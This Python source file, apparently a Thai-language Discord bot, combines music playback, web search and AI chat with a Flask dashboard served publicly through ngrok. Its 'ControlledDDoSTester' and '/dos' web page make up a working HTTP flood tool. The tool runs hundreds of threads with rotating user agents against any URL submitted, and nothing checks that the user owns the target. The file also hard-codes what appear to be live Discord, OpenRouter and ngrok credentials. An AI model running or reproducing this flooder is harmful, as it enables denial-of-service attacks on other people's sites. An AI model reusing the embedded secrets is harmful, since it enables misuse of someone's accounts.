
import sys
import subprocess
import os
import threading
import time
import json
import re
import random
import tempfile
import shutil
import zipfile
import io
import traceback
import urllib.parse
import xml.etree.ElementTree as ET
from collections import deque
from urllib.parse import urlparse
from concurrent.futures import ThreadPoolExecutor, as_completed

REQUIRED_PACKAGES = {
    "discord": "discord.py",
    "aiohttp": "aiohttp",
    "pytubefix": "pytubefix==8.12.2",
    "bs4": "beautifulsoup4",
    "nacl": "PyNaCl",
    "flask": "Flask",
    "pyngrok": "pyngrok",
    "requests": "requests"
}

def install_package(package_name):
    print(f"📦 กำลังติดตั้ง {package_name}...")
    subprocess.check_call([sys.executable, "-m", "pip", "install", "--quiet", package_name])

for import_name, package_name in REQUIRED_PACKAGES.items():
    try:
        __import__(import_name)
    except ImportError:
        try:
            install_package(package_name)
        except Exception as e:
            print(f"⚠️ ติดตั้ง {package_name} ไม่สำเร็จ: {e}")

try:
    from async_timeout import timeout as async_timeout
except ImportError:
    try:
        from asyncio import timeout as async_timeout
    except ImportError:
        install_package("async_timeout")
        from async_timeout import timeout as async_timeout

import discord
from discord.ext import commands
import aiohttp
import asyncio
from pytubefix import YouTube, Search
from pyngrok import ngrok, conf
from flask import Flask, request, jsonify, render_template_string
import requests as req_lib

DISCORD_TOKEN      = "MTQyMDYyMDYwMzQ4ODIxMTAwNQ.GGdG_w.Ng2BmLGdipQv_-Hyg7O3POcc-PwbXgYkLyeE08"
OPENROUTER_API_KEY = "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"
OPENROUTER_URL     = "https://openrouter.ai/api/v1/chat/completions"
NGROK_TOKEN        = "2uUgH3ilof7oYTgdlgIYE4EbkUT_5mNuioHqPp6vSeHzhvdwB"
NGROK_DOMAIN       = "trisyllabic-overambitiously-laney.ngrok-free.dev"
FLASK_PORT         = 5000
TS_PASSWORD        = "justdoit"

FFMPEG_OPTS_BEFORE = (
    '-reconnect 1 -reconnect_streamed 1 -reconnect_delay_max 5 '
    '-reconnect_at_eof 1 -analyzeduration 2147483647 -probesize 2147483647 '
    '-loglevel quiet'
)
FFMPEG_OPTS = (
    '-vn -ar 48000 -ac 2 '
    '-af "loudnorm=I=-16:TP=-1.5:LRA=11,'
    'equalizer=f=80:width_type=o:width=2:g=2,'
    'equalizer=f=8000:width_type=o:width=2:g=1" '
    '-b:a 320k -bufsize 512k -compression_level 0'
)

DEFAULT_MODELS = [
    "openrouter/free",
    "stepfun/step-3.5-flash:free",
    "meta-llama/llama-3.3-70b-instruct:free",
    "google/gemma-3-27b-it:free",
    "deepseek/deepseek-r1-0528:free",
    "mistralai/mistral-small-3.1-24b-instruct:free",
    "qwen/qwen3-4b:free",
    "nvidia/nemotron-nano-9b-v2:free",
]

MODEL_DISPLAY_NAMES = {
    "openrouter/free": "Free Models Router",
    "stepfun/step-3.5-flash:free": "Step 3.5 Flash",
    "meta-llama/llama-3.3-70b-instruct:free": "Llama 3.3 70B",
    "google/gemma-3-27b-it:free": "Gemma 3 27B",
    "deepseek/deepseek-r1-0528:free": "DeepSeek R1 0528",
    "mistralai/mistral-small-3.1-24b-instruct:free": "Mistral Small 3.1 24B",
    "qwen/qwen3-4b:free": "Qwen3 4B",
    "nvidia/nemotron-nano-9b-v2:free": "Nemotron Nano 9B V2",
}

SEARCH_ENGINES = ["duckduckgo", "google", "bing", "yahoo"]

user_model             = {}
user_search_engine     = {}
user_private_channels  = {}
private_channel_owners = {}
conversation_history   = {}
music_players          = {}
auto_mode_guilds       = {}
like_mode_guilds       = {}
bot_created_vc         = {}
maneg_guilds           = {}
ts_authed_users        = set()
current_stream_url     = {}
MAX_HISTORY_LENGTH     = 20
CMD_DELETE_DELAY       = 5
DISCORD_FILE_LIMIT     = 25 * 1024 * 1024

BROWSER_HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.9,th;q=0.8',
    'Connection': 'keep-alive',
}

def find_ffmpeg():
    for path in [
        "/data/data/com.termux/files/usr/bin/ffmpeg",
        "/data/data/com.termux/files/usr/local/bin/ffmpeg",
    ]:
        if os.path.isfile(path): return path
    try:
        r = subprocess.run(["which", "ffmpeg"], capture_output=True, text=True)
        if r.returncode == 0 and r.stdout.strip(): return r.stdout.strip()
    except Exception: pass
    return "ffmpeg"

FFMPEG_EXECUTABLE = find_ffmpeg()

def load_opus_termux():
    if discord.opus.is_loaded(): return True
    for path in [
        "/data/data/com.termux/files/usr/lib/libopus.so",
        "/data/data/com.termux/files/usr/lib/libopus.so.0",
        "/usr/lib/libopus.so.0",
        "/usr/lib/aarch64-linux-gnu/libopus.so.0",
        "/usr/lib/x86_64-linux-gnu/libopus.so.0",
        "libopus",
    ]:
        try:
            discord.opus.load_opus(path)
            if discord.opus.is_loaded(): return True
        except Exception: continue
    return False

class ControlledDDoSTester:
    def __init__(self, target_rps_per_thread=20, max_threads=500):
        self.total_requests = 0
        self.active_connections = 0
        self.is_running = False
        self.start_time = None
        self.target_rps_per_thread = target_rps_per_thread
        self.max_threads = max_threads
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
        ]
        self.thread_stats = {}
        self.lock = threading.Lock()

    async def controlled_http_attack(self, thread_id, url, duration=60):
        session = None
        start_time = time.time()
        request_count = 0
        try:
            connector = aiohttp.TCPConnector(limit=10, ttl_dns_cache=300)
            timeout = aiohttp.ClientTimeout(total=10)
            session = aiohttp.ClientSession(connector=connector, timeout=timeout)
            while self.is_running and (time.time() - start_time < duration):
                thread_start_time = time.time()
                requests_this_cycle = 0
                while requests_this_cycle < self.target_rps_per_thread:
                    if not self.is_running: break
                    try:
                        headers = {
                            'User-Agent': random.choice(self.user_agents),
                            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                            'Connection': 'keep-alive',
                        }
                        endpoints = ['/', '/index.html', '/api/v1/test', '/home', '/about']
                        target_url = url.rstrip('/') + random.choice(endpoints)
                        if random.random() > 0.7:
                            data = {'test': 'data', 'timestamp': int(time.time() * 1000)}
                            async with session.post(target_url, headers=headers, json=data) as response:
                                await response.read()
                        else:
                            async with session.get(target_url, headers=headers) as response:
                                await response.read()
                        with self.lock:
                            self.total_requests += 1
                            request_count += 1
                            requests_this_cycle += 1
                    except Exception:
                        pass
                elapsed = time.time() - thread_start_time
                if elapsed < 1.0:
                    await asyncio.sleep(1.0 - elapsed)
        except Exception:
            pass
        finally:
            if session: await session.close()
            with self.lock:
                self.thread_stats[thread_id] = {
                    'total_requests': request_count,
                    'duration': time.time() - start_time
                }

    async def run_thread_async(self, thread_id, url, duration):
        await self.controlled_http_attack(thread_id, url, duration)

    def thread_worker(self, thread_id, url, duration):
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        try:
            loop.run_until_complete(self.run_thread_async(thread_id, url, duration))
        finally:
            loop.close()

class DDoSManager:
    def __init__(self):
        self.tester = None
        self.executor = None
        self.task_thread = None

    def start(self, url, threads, rps, duration):
        if self.tester and self.tester.is_running:
            return False, "ระบบกำลังทำงานอยู่แล้ว กรุณาหยุดก่อน"
        self.tester = ControlledDDoSTester(target_rps_per_thread=rps, max_threads=threads)
        self.tester.is_running = True
        self.tester.start_time = time.time()
        
        def run_attack():
            duration_sec = duration * 60
            with ThreadPoolExecutor(max_workers=threads) as executor:
                self.executor = executor
                futures = [executor.submit(self.tester.thread_worker, i, url, duration_sec) for i in range(threads)]
                try:
                    for future in as_completed(futures):
                        try: future.result(timeout=duration_sec + 10)
                        except Exception: pass
                except Exception: pass
            if self.tester: self.tester.is_running = False

        self.task_thread = threading.Thread(target=run_attack, daemon=True)
        self.task_thread.start()
        return True, "เริ่มการทดสอบแล้ว"

    def stop(self):
        if self.tester: self.tester.is_running = False
        if self.executor: self.executor.shutdown(wait=False, cancel_futures=True)
        return True, "หยุดการทดสอบแล้ว"

    def get_stats(self):
        if not self.tester:
            return {"status": "Idle", "requests": 0, "rps": 0, "threads": 0, "elapsed": 0}
        elapsed = time.time() - (self.tester.start_time or time.time())
        current_reqs = self.tester.total_requests
        rps = current_reqs / elapsed if elapsed > 0 else 0
        return {
            "status": "Running" if self.tester.is_running else "Finished/Stopped",
            "requests": current_reqs,
            "rps": round(rps, 2),
            "threads": len(self.tester.thread_stats),
            "elapsed": round(elapsed, 1)
        }

global_ddos = DDoSManager()

app = Flask(__name__)

SHARED_CSS = """
<style>
@import url('https://fonts.googleapis.com/css2?family=Playfair+Display:ital,wght@0,600;1,400&family=Lora:wght@400;500&display=swap');
:root {
  --bg: #140a0f;
  --surface: #24131a;
  --primary: #d65c7a;
  --primary-hover: #b54560;
  --text: #fce8ed;
  --text-dim: #b595a0;
  --border: #422531;
}
* { box-sizing: border-box; margin: 0; padding: 0; }
body {
  background: linear-gradient(135deg, #140a0f 0%, #3d1b2a 50%, #140a0f 100%);
  background-size: 400% 400%;
  animation: gradientBG 15s ease infinite;
  color: var(--text);
  font-family: 'Lora', serif;
  min-height: 100vh;
  display: flex; flex-direction: column;
}
@keyframes gradientBG {
  0% { background-position: 0% 50%; }
  50% { background-position: 100% 50%; }
  100% { background-position: 0% 50%; }
}
h1, h2, h3, .brand { font-family: 'Playfair Display', serif; color: var(--primary); font-weight: 600; }
a { color: var(--primary); text-decoration: none; transition: 0.3s; }
a:hover { color: var(--text); }
button {
  background: var(--primary); color: #fff; border: none;
  padding: 10px 20px; border-radius: 6px; font-family: 'Lora', serif;
  cursor: pointer; transition: 0.3s; font-size: 15px;
}
button:hover { background: var(--primary-hover); box-shadow: 0 0 15px rgba(214, 92, 122, 0.4); }
input {
  background: #1a0d13; border: 1px solid var(--border); color: var(--text);
  padding: 10px 15px; border-radius: 6px; font-family: 'Lora', serif; outline: none; width: 100%;
}
input:focus { border-color: var(--primary); }
.glass-panel {
  background: rgba(36, 19, 26, 0.7);
  backdrop-filter: blur(10px);
  border: 1px solid var(--border);
  border-radius: 12px;
  padding: 30px;
}
nav {
  padding: 20px 40px; display: flex; justify-content: space-between; align-items: center;
  border-bottom: 1px solid var(--border); background: rgba(20, 10, 15, 0.8);
}
.nav-links a { margin-left: 20px; font-size: 16px; }
</style>
"""

HTML_DASHBOARD = f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>dos eiei Dashboard</title>
{SHARED_CSS}
</head>
<body>
  <nav>
    <div class="brand" style="font-size: 24px;">dos eiei</div>
    <div class="nav-links">
      <a href="/">Home</a>
      <a href="/dos">Load Tester</a>
    </div>
  </nav>
  <div style="flex: 1; display: flex; align-items: center; justify-content: center; padding: 20px;">
    <div class="glass-panel" style="text-align: center; max-width: 500px;">
      <h1 style="font-size: 36px; margin-bottom: 20px;">Welcome</h1>
      <p style="color: var(--text-dim); margin-bottom: 30px; line-height: 1.6;">
        Manage your server, stream YouTube videos with AI chat, or perform controlled load testing with elegance.
      </p>
      <div style="display: flex; gap: 15px; justify-content: center;">
        <button onclick="location.href='/dos'">Open Load Tester</button>
      </div>
    </div>
  </div>
</body>
</html>
"""

HTML_DOS = f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Load Tester - dos eiei</title>
{SHARED_CSS}
<style>
  .stat-box {{ background: rgba(20, 10, 15, 0.6); padding: 15px; border-radius: 8px; border: 1px solid var(--border); }}
</style>
</head>
<body>
  <nav>
    <div class="brand" style="font-size: 24px;">dos eiei</div>
    <div class="nav-links"><a href="/">Home</a><a href="/dos">Load Tester</a></div>
  </nav>
  <div style="padding: 40px 20px;">
    <div class="glass-panel" style="max-width: 600px; margin: 0 auto;">
      <h2 style="text-align: center; margin-bottom: 25px;">Controlled Load Tester</h2>
      <div style="display: flex; flex-direction: column; gap: 15px;">
        <div>
          <label style="font-size: 14px; color: var(--text-dim); margin-bottom: 5px; display: block;">Target URL</label>
          <input type="text" id="url" placeholder="http://example.com">
        </div>
        <div style="display: flex; gap: 15px;">
          <div style="flex: 1;">
            <label style="font-size: 14px; color: var(--text-dim); margin-bottom: 5px; display: block;">Threads</label>
            <input type="number" id="threads" value="500">
          </div>
          <div style="flex: 1;">
            <label style="font-size: 14px; color: var(--text-dim); margin-bottom: 5px; display: block;">RPS / Thread</label>
            <input type="number" id="rps" value="20">
          </div>
          <div style="flex: 1;">
            <label style="font-size: 14px; color: var(--text-dim); margin-bottom: 5px; display: block;">Duration (min)</label>
            <input type="number" id="duration" value="10">
          </div>
        </div>
        <div style="display: flex; gap: 15px; justify-content: center; margin-top: 15px;">
          <button onclick="startDos()" style="width: 150px;">Start</button>
          <button onclick="stopDos()" style="width: 150px; background: #422531;">Stop</button>
        </div>
        <div id="msg" style="text-align: center; margin-top: 10px; font-size: 14px; color: var(--primary);"></div>
      </div>
      
      <div style="margin-top: 40px; border-top: 1px solid var(--border); padding-top: 25px;">
        <h3 style="text-align: center; margin-bottom: 20px; font-size: 20px;">Real-time Statistics</h3>
        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 15px; text-align: center;">
          <div class="stat-box">
            <div style="font-size: 12px; color: var(--text-dim);">Status</div>
            <div id="stat-status" style="font-size: 18px; font-weight: bold; color: var(--primary); margin-top: 5px;">Idle</div>
          </div>
          <div class="stat-box">
            <div style="font-size: 12px; color: var(--text-dim);">Total Requests</div>
            <div id="stat-reqs" style="font-size: 18px; font-weight: bold; margin-top: 5px;">0</div>
          </div>
          <div class="stat-box">
            <div style="font-size: 12px; color: var(--text-dim);">Current RPS</div>
            <div id="stat-rps" style="font-size: 18px; font-weight: bold; margin-top: 5px;">0</div>
          </div>
          <div class="stat-box">
            <div style="font-size: 12px; color: var(--text-dim);">Elapsed Time</div>
            <div id="stat-time" style="font-size: 18px; font-weight: bold; margin-top: 5px;">0s</div>
          </div>
        </div>
      </div>
    </div>
  </div>
<script>
  async function startDos() {{
    const url = document.getElementById('url').value;
    const threads = document.getElementById('threads').value;
    const rps = document.getElementById('rps').value;
    const duration = document.getElementById('duration').value;
    const msg = document.getElementById('msg');
    msg.textContent = "Starting...";
    try {{
      const res = await fetch('/api/dos/start', {{
        method: 'POST', headers: {{'Content-Type': 'application/json'}},
        body: JSON.stringify({{url, threads, rps, duration}})
      }});
      const data = await res.json();
      msg.textContent = data.message;
    }} catch(e) {{ msg.textContent = "Error starting"; }}
  }}
  async function stopDos() {{
    const msg = document.getElementById('msg');
    try {{
      const res = await fetch('/api/dos/stop', {{method: 'POST'}});
      const data = await res.json();
      msg.textContent = data.message;
    }} catch(e) {{ msg.textContent = "Error stopping"; }}
  }}
  setInterval(async () => {{
    try {{
      const res = await fetch('/api/dos/stats');
      const data = await res.json();
      document.getElementById('stat-status').textContent = data.status;
      document.getElementById('stat-reqs').textContent = data.requests.toLocaleString();
      document.getElementById('stat-rps').textContent = data.rps.toLocaleString();
      document.getElementById('stat-time').textContent = data.elapsed + "s";
    }} catch(e) {{}}
  }}, 1000);
</script>
</body>
</html>
"""

HTML_STREAM = f"""<!DOCTYPE html>
<html lang="th">
<head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
<title>🎬 Stream Viewer - dos eiei</title>
{SHARED_CSS}
<style>
  body {{ height: 100dvh; overflow: hidden; display: flex; flex-direction: column; background: #000; }}
  nav {{ display: none; }}
  #video-wrap {{ flex: 1; position: relative; background: #000; min-height: 0; }}
  #video-wrap iframe {{ width: 100%; height: 100%; border: none; display: block; }}
  
  #chat-panel {{
    background: rgba(36, 19, 26, 0.95); backdrop-filter: blur(10px);
    border-top: 1px solid var(--primary); display: flex; flex-direction: column;
    transition: height 0.3s ease; height: 320px; min-height: 44px; max-height: 60dvh;
  }}
  #chat-panel.collapsed {{ height: 44px; }}
  #chat-header {{
    display: flex; align-items: center; justify-content: space-between;
    padding: 8px 14px; background: rgba(20, 10, 15, 0.9); cursor: pointer;
    user-select: none; flex-shrink: 0; height: 44px; border-bottom: 1px solid var(--border);
  }}
  #chat-header span {{ font-size: 15px; font-family: 'Playfair Display', serif; color: var(--primary); font-weight: 600; }}
  #toggle-btn {{ background: transparent; color: var(--primary); padding: 0; font-size: 16px; }}
  #toggle-btn:hover {{ box-shadow: none; color: var(--text); }}
  
  #chat-messages {{
    flex: 1; overflow-y: auto; padding: 10px 14px; display: flex; flex-direction: column; gap: 8px;
  }}
  #chat-messages::-webkit-scrollbar {{ width: 4px; }}
  #chat-messages::-webkit-scrollbar-thumb {{ background: var(--primary); border-radius: 4px; }}
  
  .msg {{ max-width: 88%; padding: 8px 12px; border-radius: 12px; font-size: 14px; line-height: 1.5; word-break: break-word; }}
  .msg.user  {{ align-self: flex-end; background: var(--primary); color: #fff; border-bottom-right-radius: 3px; }}
  .msg.bot   {{ align-self: flex-start; background: #3d232d; color: var(--text); border: 1px solid var(--border); border-bottom-left-radius: 3px; }}
  .msg.system {{ align-self: center; background: transparent; color: var(--text-dim); font-size: 12px; font-style: italic; }}
  
  #chat-input-row {{ display: flex; gap: 8px; padding: 10px 14px; flex-shrink: 0; background: rgba(20, 10, 15, 0.9); border-top: 1px solid var(--border); }}
  #chat-input {{ flex: 1; background: #140a0f; border-radius: 20px; padding: 8px 15px; }}
  #send-btn {{ border-radius: 50%; width: 38px; height: 38px; padding: 0; display: flex; align-items: center; justify-content: center; }}
  
  @media (orientation: landscape) and (max-height: 500px) {{
    body {{ flex-direction: row; }}
    #video-wrap {{ flex: 1; height: 100dvh; }}
    #chat-panel {{ width: 300px; height: 100dvh !important; border-top: none; border-left: 1px solid var(--primary); }}
    #chat-panel.collapsed {{ width: 44px; height: 100dvh !important; flex-direction: column; }}
    #chat-header {{ writing-mode: vertical-rl; height: auto; width: 44px; justify-content: center; padding: 14px 8px; }}
    #chat-panel.collapsed #chat-messages, #chat-panel.collapsed #chat-input-row {{ display: none; }}
  }}
</style>
</head>
<body>
<div id="video-wrap">
  <iframe src="https://www.youtube.com/embed/{{{{ video_id }}}}?autoplay=1&vq=hd1080&rel=0&modestbranding=1" allow="autoplay; fullscreen" allowfullscreen></iframe>
</div>
<div id="chat-panel">
  <div id="chat-header" onclick="toggleChat()">
    <span>🌹 AI Chat</span><button id="toggle-btn">▼</button>
  </div>
  <div id="chat-messages"><div class="msg system">💬 พิมพ์คำถามเพื่อคุยกับ AI ได้เลย!</div></div>
  <div id="chat-input-row">
    <input id="chat-input" type="text" placeholder="พิมพ์ข้อความ..." autocomplete="off">
    <button id="send-btn" onclick="sendMessage()">➤</button>
  </div>
</div>
<script>
let collapsed = false;
function toggleChat() {{
  collapsed = !collapsed;
  document.getElementById('chat-panel').classList.toggle('collapsed', collapsed);
  document.getElementById('toggle-btn').textContent = collapsed ? '▲' : '▼';
}}
document.getElementById('chat-input').addEventListener('keydown', e => {{ if (e.key === 'Enter') sendMessage(); }});
function addMsg(text, role) {{
  const box = document.getElementById('chat-messages');
  const div = document.createElement('div'); div.className = 'msg ' + role; div.textContent = text;
  box.appendChild(div); box.scrollTop = box.scrollHeight;
}}
async function sendMessage() {{
  const input = document.getElementById('chat-input'); const text = input.value.trim();
  if (!text) return; input.value = ''; addMsg(text, 'user');
  try {{
    const resp = await fetch('/api/chat', {{ method: 'POST', headers: {{ 'Content-Type': 'application/json' }}, body: JSON.stringify({{ message: text }}) }});
    const data = await resp.json(); addMsg(data.reply || '❌ ไม่ได้รับคำตอบ', 'bot');
  }} catch(e) {{ addMsg('❌ Error: ' + e.message, 'system'); }}
}}
</script>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(HTML_DASHBOARD)

@app.route('/dos')
def dos_page():
    return render_template_string(HTML_DOS)

@app.route('/stream')
def stream_page():
    video_id = request.args.get('v', '')
    return render_template_string(HTML_STREAM, video_id=video_id)

@app.route('/api/chat', methods=['POST'])
def chat_api():
    data = request.json
    msg  = data.get('message', '')
    try:
        headers = {"Authorization": f"Bearer {OPENROUTER_API_KEY}", "Content-Type": "application/json"}
        payload = {"model": DEFAULT_MODELS[1], "messages": [{"role": "user", "content": msg}]}
        r = req_lib.post(OPENROUTER_URL, headers=headers, json=payload, timeout=30)
        if r.status_code == 200: reply = r.json()['choices'][0]['message']['content']
        else: reply = f"❌ API error: {r.status_code}"
    except Exception as e: reply = f"❌ Error: {str(e)}"
    return jsonify({"reply": reply})

@app.route('/api/dos/start', methods=['POST'])
def api_dos_start():
    data = request.json
    url = data.get('url')
    threads = int(data.get('threads', 500))
    rps = int(data.get('rps', 20))
    duration = int(data.get('duration', 10))
    if not url: return jsonify({"success": False, "message": "URL is required"})
    success, msg = global_ddos.start(url, threads, rps, duration)
    return jsonify({"success": success, "message": msg})

@app.route('/api/dos/stop', methods=['POST'])
def api_dos_stop():
    success, msg = global_ddos.stop()
    return jsonify({"success": success, "message": msg})

@app.route('/api/dos/stats', methods=['GET'])
def api_dos_stats():
    return jsonify(global_ddos.get_stats())

def run_flask():
    app.run(host='0.0.0.0', port=FLASK_PORT, debug=False, use_reloader=False)

def start_ngrok():
    conf.get_default().auth_token = NGROK_TOKEN
    for tunnel in ngrok.get_tunnels(): ngrok.disconnect(tunnel.public_url)
    tunnel = ngrok.connect(addr=FLASK_PORT, proto="http", domain=NGROK_DOMAIN)
    return f"https://{NGROK_DOMAIN}"

flask_thread = threading.Thread(target=run_flask, daemon=True)
flask_thread.start()

try:
    PUBLIC_URL = start_ngrok()
    print(f"✅ ngrok เชื่อมต่อแล้ว: {PUBLIC_URL}")
except Exception as e:
    PUBLIC_URL = f"http://localhost:{FLASK_PORT}"
    print(f"⚠️ ngrok error: {e} — ใช้ local แทน")

intents = discord.Intents.default()
intents.message_content = True
intents.voice_states    = True
intents.guilds          = True
bot = commands.Bot(command_prefix='!', intents=intents)
bot.remove_command('help')

async def auto_delete_cmd(ctx, delay=CMD_DELETE_DELAY):
    await asyncio.sleep(delay)
    try: await ctx.message.delete()
    except Exception: pass

def schedule_delete(ctx, delay=CMD_DELETE_DELAY):
    asyncio.ensure_future(auto_delete_cmd(ctx, delay))

def get_display_model_name(m):
    return MODEL_DISPLAY_NAMES.get(m, m.split('/')[-1].replace(':free','').replace('-',' ').title())

async def fetch_ai_response(model_name, messages, system_prompt=None):
    msgs = []
    if system_prompt: msgs.append({"role": "system", "content": system_prompt})
    msgs.extend(messages)
    async with aiohttp.ClientSession() as session:
        headers = {"Authorization": f"Bearer {OPENROUTER_API_KEY}", "Content-Type": "application/json"}
        payload = {"model": model_name, "messages": msgs}
        async with session.post(OPENROUTER_URL, headers=headers, json=payload) as resp:
            if resp.status == 200:
                data = await resp.json()
                return data['choices'][0]['message']['content']
            text = await resp.text()
            raise Exception(f"HTTP {resp.status}: {text[:200]}")

def get_video_id(url):
    patterns = [r'(?:v=|youtu\.be/|embed/)([a-zA-Z0-9_-]{11})', r'(?:shorts/)([a-zA-Z0-9_-]{11})']
    for p in patterns:
        m = re.search(p, url)
        if m: return m.group(1)
    return None

def get_youtube_info(query, audio_only=True):
    try:
        yt = YouTube(query) if query.startswith('http') else Search(query).videos[0]
        if audio_only:
            stream = (yt.streams.filter(only_audio=True, mime_type="audio/webm").order_by('abr').last()
                      or yt.streams.filter(only_audio=True).order_by('abr').last()
                      or yt.streams.filter(only_audio=True).first())
        else:
            stream = (yt.streams.filter(progressive=True).order_by('resolution').last()
                      or yt.streams.filter(progressive=True).first())
        if not stream: raise Exception("ไม่พบ stream")
        return {
            'title': yt.title, 'url': stream.url, 'duration': yt.length,
            'uploader': yt.author, 'webpage_url': yt.watch_url,
            'thumbnail': yt.thumbnail_url,
            'resolution': getattr(stream,'resolution','audio'),
            'abr': getattr(stream,'abr','N/A'),
        }
    except Exception as e:
        raise Exception(f"YouTube error: {e}")

def search_artist_songs(artist_name: str, max_songs: int = 20) -> list:
    try:
        results = Search(f"{artist_name} top songs popular").videos[:max_songs]
        songs = []
        for v in results:
            if v and v.watch_url:
                songs.append({'title': v.title, 'webpage_url': v.watch_url, 'thumbnail': v.thumbnail_url, 'views': getattr(v, 'views', 0) or 0})
        songs.sort(key=lambda x: x['views'], reverse=True)
        return songs
    except Exception as e:
        print(f"Artist search error: {e}")
        return []

async def perform_web_search(query, engine="duckduckgo", num_results=5):
    from bs4 import BeautifulSoup
    encoded = urllib.parse.quote(query)
    results = []
    try:
        async with aiohttp.ClientSession() as session:
            if engine == "google":
                url = f"https://www.google.com/search?q={encoded}&num={num_results+2}"
                async with session.get(url, headers=BROWSER_HEADERS, timeout=15) as resp:
                    if resp.status != 200: return None, f"Google HTTP {resp.status}"
                    soup = BeautifulSoup(await resp.text(), 'html.parser')
                    for g in soup.find_all('div', class_='tF2Cxc')[:num_results]:
                        title = g.find('h3'); link = g.find('a'); desc = g.find('div', class_='VwiC3b')
                        if title and link: results.append({"title": title.text, "url": link['href'], "description": desc.text if desc else ""})
            else:
                url = f"https://html.duckduckgo.com/html/?q={encoded}"
                async with session.get(url, headers=BROWSER_HEADERS, timeout=15) as resp:
                    if resp.status != 200: return None, f"DuckDuckGo HTTP {resp.status}"
                    soup = BeautifulSoup(await resp.text(), 'html.parser')
                    for r in soup.find_all('div', class_='result')[:num_results]:
                        t = r.find('a', class_='result__a'); u = r.find('a', class_='result__url'); s = r.find('a', class_='result__snippet')
                        if t and u:
                            link = u.get('href','')
                            if link.startswith('//'): link = 'https:' + link
                            results.append({"title": t.get_text(strip=True), "url": link, "description": s.get_text(strip=True) if s else ""})
        return results, None
    except Exception as e: return None, str(e)

async def search_images_ddg(query, max_results=4):
    try:
        encoded = urllib.parse.quote(query)
        url = f"https://duckduckgo.com/?q={encoded}&iax=images&ia=images"
        async with aiohttp.ClientSession() as session:
            async with session.get(url, headers=BROWSER_HEADERS, timeout=15) as resp: html = await resp.text()
            vqd = re.search(r'vqd=["\']([^"\']+)["\']', html)
            if not vqd: return []
            img_url = f"https://duckduckgo.com/i.js?l=us-en&o=json&q={encoded}&vqd={vqd.group(1)}&f=,,,,,,"
            h = BROWSER_HEADERS.copy(); h['Referer'] = 'https://duckduckgo.com/'
            async with session.get(img_url, headers=h, timeout=15) as resp:
                if resp.status != 200: return []
                data = await resp.json()
                return [{'title': r.get('title',''), 'image': r.get('image',''), 'url': r.get('url','')} for r in data.get('results',[])[:max_results]]
    except Exception as e: return []

def srt_time_to_seconds(ts: str) -> float:
    ts = ts.strip().replace(',', '.')
    parts = ts.split(':')
    try: return int(parts[0]) * 3600 + int(parts[1]) * 60 + float(parts[2])
    except Exception: return 0.0

def parse_srt(srt_text: str) -> list:
    segments = []
    for block in re.split(r'\n\n+', srt_text.strip()):
        lines = block.strip().split('\n')
        if len(lines) < 3: continue
        ts_match = re.match(r'(\d+:\d+:\d+[,\.]\d+)\s*-->\s*(\d+:\d+:\d+[,\.]\d+)', lines[1])
        if not ts_match: continue
        start = srt_time_to_seconds(ts_match.group(1))
        end   = srt_time_to_seconds(ts_match.group(2))
        text  = re.sub(r'<[^>]+>', '', ' '.join(l.strip() for l in lines[2:] if l.strip())).strip()
        if text: segments.append({'start': start, 'end': end, 'text': text})
    return segments

def parse_xml_captions(xml_text: str) -> list:
    segments = []
    try:
        root = ET.fromstring(xml_text)
        for p in root.iter('p'):
            start = float(p.get('t', 0)) / 1000
            dur   = float(p.get('d', 2000)) / 1000
            parts = [s.text for s in p.iter('s') if s.text]
            if not parts and p.text: parts.append(p.text)
            text = re.sub(r'\s+', ' ', ' '.join(parts)).strip()
            if text: segments.append({'start': start, 'end': start + dur, 'text': text})
    except Exception: pass
    return segments

def get_youtube_captions(webpage_url: str) -> tuple:
    try:
        yt = YouTube(webpage_url)
        caps = yt.captions
        if not caps: return None, []
        cap = None
        for lang in ['th', 'a.th', 'en', 'a.en']:
            if lang in caps: cap = caps[lang]; break
        if not cap: cap = list(caps.values())[0]
        lang_name = getattr(cap, 'name', getattr(cap, 'code', 'Unknown'))
        try:
            segs = parse_srt(cap.generate_srt_captions())
            if segs: return lang_name, segs
        except Exception: pass
        try:
            segs = parse_xml_captions(cap.xml_captions)
            if segs: return lang_name, segs
        except Exception: pass
        return lang_name, []
    except Exception: return None, []

def find_current_segment(segments: list, elapsed: float):
    for i, seg in enumerate(segments):
        if seg['start'] <= elapsed < seg['end']: return i, seg
    return -1, None

class SubtitleView(discord.ui.View):
    def __init__(self, player, guild_id: int):
        super().__init__(timeout=None)
        self.player = player
        self.guild_id = guild_id

    @discord.ui.button(label="🎤 ซับ ON", style=discord.ButtonStyle.success, custom_id="sub_toggle")
    async def toggle_subtitle(self, interaction: discord.Interaction, button: discord.ui.Button):
        player = music_players.get(self.guild_id)
        if not player: return await interaction.response.send_message("❌ ไม่มี Player", ephemeral=True)
        player.subtitle_enabled = not player.subtitle_enabled
        if player.subtitle_enabled:
            button.label = "🎤 ซับ ON"; button.style = discord.ButtonStyle.success
            if not player.subtitle_task or player.subtitle_task.done():
                player.subtitle_task = bot.loop.create_task(player.run_subtitle_loop())
        else:
            button.label = "🎤 ซับ OFF"; button.style = discord.ButtonStyle.secondary
            if player.subtitle_task and not player.subtitle_task.done():
                player.subtitle_task.cancel(); player.subtitle_task = None
        await interaction.response.edit_message(view=self)

    @discord.ui.button(label="📋 Lyrics ทั้งหมด", style=discord.ButtonStyle.primary, custom_id="sub_all")
